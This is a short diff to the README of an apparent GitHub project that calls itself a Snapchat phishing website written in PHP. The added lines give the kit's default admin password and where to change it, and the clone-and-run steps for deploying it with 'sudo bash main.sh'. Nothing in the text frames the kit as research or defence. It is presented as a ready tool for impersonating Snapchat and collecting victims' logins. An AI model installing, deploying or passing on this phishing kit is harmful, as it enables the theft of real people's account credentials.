@@ -10,6 +10,18 @@
 
 Snapchat phishing website in php
 
+the admin password is "123" and can be changed in the index.php file in the snaps/logs folder.
+
+to run and install this use these steps:
+
+git clone https://github.com/TH3-PH0B14/Snap.Hack
+
+cd Snap.Hack
+
+sudo bash main.sh
+
+then the program should work.
+
 ## Terminal Screen
 <img src="Terminal.png" alt="Terminal Screen" width="500">
 
